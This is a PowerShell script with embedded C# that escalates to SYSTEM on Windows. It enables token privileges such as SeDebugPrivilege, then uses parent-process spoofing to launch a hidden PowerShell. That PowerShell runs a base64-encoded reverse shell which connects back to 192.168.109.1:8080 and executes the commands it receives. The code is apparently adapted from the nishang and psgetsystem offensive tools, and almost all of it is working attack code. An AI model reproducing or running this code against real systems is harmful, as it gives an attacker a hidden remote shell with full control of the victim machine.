$definitions = @"
using System; 
using System.Collections.Generic; 
using System.Diagnostics; 
using System.Linq; 
using System.Runtime.InteropServices; 

public class definitions
{
    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
    public static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall, ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen); 

    [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)] 
    public static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr phtok); 

    [DllImport("advapi32.dll", SetLastError = true)] 
    public static extern bool LookupPrivilegeValue(string host, string name, ref long pluid); 

}   

[StructLayout(LayoutKind.Sequential, Pack = 1)]  
public struct TokPriv1Luid 
{ 
    public int Count; 
    public long Luid; 
    public int Attr; 
} 

    


"@

Add-Type $definitions

$privs = @("SeAssignPrimaryTokenPrivilege", "SeAuditPrivilege", "SeBackupPrivilege", 
            "SeChangeNotifyPrivilege", "SeCreateGlobalPrivilege", "SeCreatePagefilePrivilege", 
            "SeCreatePermanentPrivilege", "SeCreateSymbolicLinkPrivilege", "SeCreateTokenPrivilege", 
            "SeDebugPrivilege", "SeEnableDelegationPrivilege", "SeImpersonatePrivilege", "SeIncreaseBasePriorityPrivilege", 
            "SeIncreaseQuotaPrivilege", "SeIncreaseWorkingSetPrivilege", "SeLoadDriverPrivilege", 
            "SeLockMemoryPrivilege", "SeMachineAccountPrivilege", "SeManageVolumePrivilege", 
            "SeProfileSingleProcessPrivilege", "SeRelabelPrivilege", "SeRemoteShutdownPrivilege", 
            "SeRestorePrivilege", "SeSecurityPrivilege", "SeShutdownPrivilege", "SeSyncAgentPrivilege", 
            "SeSystemEnvironmentPrivilege", "SeSystemProfilePrivilege", "SeSystemtimePrivilege", 
            "SeTakeOwnershipPrivilege", "SeTcbPrivilege", "SeTimeZonePrivilege", "SeTrustedCredManAccessPrivilege", 
            "SeUndockPrivilege", "SeUnsolicitedInputPrivilege", "SeDelegateSessionUserImpersonatePrivilege")


function Set_Privilege([string]$arg1, [string]$arg2) 
{
    # Arg checks
    #
    #
    if ( $privs -notcontains $arg1 )
    {
        Write-Host $arg1 "is not a valid privilege. Check https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/user-rights-assignment for more info "
        Break Set_Privilege
    }
 

    if ( $arg2 -like "enable" )
    {
        # SE_PRIVILEGE_ENABLED = 0x00000002;     
        $SE_PRIVILEGE = 0x00000002
    }
    elseif  ( $arg2 -like "disable" )
    {
        # SE_PRIVILEGE_DISABLED = 0x00000000; 
        $SE_PRIVILEGE = 0x00000000
    }
    else {
        Write-Host $arg2 "is not a valid argument. It should be either be Enable or Disable"
        Break Set_Privilege
    }



    [bool] $retVal = 0; 

    [IntPtr] $hproc = (Get-Process -Id ([System.Diagnostics.Process]::GetCurrentProcess().Id)).Handle
    Write-Host "Handle to Current Process = "  $hproc

    [IntPtr] $htoken = [IntPtr]::Zero; 
    

    # TOKEN_QUERY = 0x00000008; 
    # TOKEN_ADJUST_PRIVILEGES = 0x00000020;      
    
    $retVal = [definitions]::OpenProcessToken($hproc, 0x28, [ref]$htoken); 

    $TokPriv1Luid = New-Object TokPriv1Luid
    $TokPriv1Luid.Count = 1
    $TokPriv1Luid.Attr = $SE_PRIVILEGE
    
	$LuidVal = $Null
    $retVal = [definitions]::LookupPrivilegeValue($null, $arg1, [ref]$LuidVal); 
    $TokPriv1Luid.Luid = $LuidVal
    $retVal = [definitions]::AdjustTokenPrivileges($htoken, $false, [ref]$TokPriv1Luid, 0, [IntPtr]::Zero, [IntPtr]::Zero);     

} # Set Privilege Function Finished








$ReverseShellScriptBlock = {
# Original Author:
#https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1

    $client = New-Object System.Net.Sockets.TCPClient("192.168.109.1",8080);    # Modify these ip/port to your host
    $strm = $client.Getstream();

    [byte[]]$bytes = 0..65535|%{0};

    $zero=0

    while(($i = $strm.Read($bytes, $zero, $bytes.Length)) -ne $zero)
    {;
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,$zero, $i);
        $sb = (Invoke-Expression $data 2>&1 | Out-String );
        $sb2  = $sb + 'PS ' + (pwd).Path + '> ';
        $sbt = ([text.encoding]::ASCII).GetBytes($sb2);
        $strm.Write($sbt,0,$sbt.Length);
        $strm.Flush()
    };

    $client.Close()
} # ReverseShellScriptBlock Privilege Function Finished



# Simple powershell/C# to spawn a process under a different parent process
# Original Author:
# https://github.com/decoder-it/psgetsystem     
# https://decoder.cloud/2018/02/02/getting-system/
function debug_priv_esc()
{

    $mycode = @"
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Runtime.InteropServices;

    public class MyProcess
    {
        [DllImport("kernel32.dll")]
        static extern uint GetLastError();
        
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
            IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);
        
            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            public int bInheritHandle;
        }

        public static void CreateProcessFromParent(int ppid, string command, string cmdargs)
        {
            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const uint CREATE_NEW_CONSOLE = 0x00000010;
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

            var pi = new PROCESS_INFORMATION();
            var si = new STARTUPINFOEX();
            si.StartupInfo.cb = Marshal.SizeOf(si);
            IntPtr lpValue = IntPtr.Zero;
            Process.EnterDebugMode();
            try
            {
                
                var lpSize = IntPtr.Zero;
                InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                si.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref lpSize);
                var phandle = Process.GetProcessById(ppid).Handle;
                Console.WriteLine("[+] Got Handle for ppid: {0}", ppid); 
                lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                Marshal.WriteIntPtr(lpValue, phandle);
                
                UpdateProcThreadAttribute(
                    si.lpAttributeList,
                    0,
                    (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                    lpValue,
                    (IntPtr)IntPtr.Size,
                    IntPtr.Zero,
                    IntPtr.Zero);
                
                Console.WriteLine("[+] Updated proc attribute list"); 
                var pattr = new SECURITY_ATTRIBUTES();
                var tattr = new SECURITY_ATTRIBUTES();
                pattr.nLength = Marshal.SizeOf(pattr);
                tattr.nLength = Marshal.SizeOf(tattr);
                Console.Write("[+] Starting " + command  + "...");
                var b= CreateProcess(command, cmdargs, ref pattr, ref tattr, false,EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE, IntPtr.Zero, null, ref si, out pi);
                Console.WriteLine(b+ " - pid: " + pi.dwProcessId+ " - Last error: "  +GetLastError() );
            }
            finally
            {
                
                if (si.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(si.lpAttributeList);
                    Marshal.FreeHGlobal(si.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValue);
                
                if (pi.hProcess != IntPtr.Zero)
                {
                    CloseHandle(pi.hProcess);
                }
                if (pi.hThread != IntPtr.Zero)
                {
                    CloseHandle(pi.hThread);
                }
            }
        }

    }
"@
    Add-Type -TypeDefinition $mycode

    #Autoinvoke?
    $cmdargs=""
    if($args.Length -eq 3)
    {
    $cmdargs= $args[1] + " " + $args[2]
    }
    

    $enc = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($ReverseShellScriptBlock)) 
    $PID_Debug= 3444
    $path = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
    $args = '-windowstyle hidden -nop -enc ' + $enc

    $cmdargs= $path + " " + $args
    $cmdargs
    [MyProcess]::CreateProcessFromParent($PID_Debug,$path,$cmdargs)

} # 




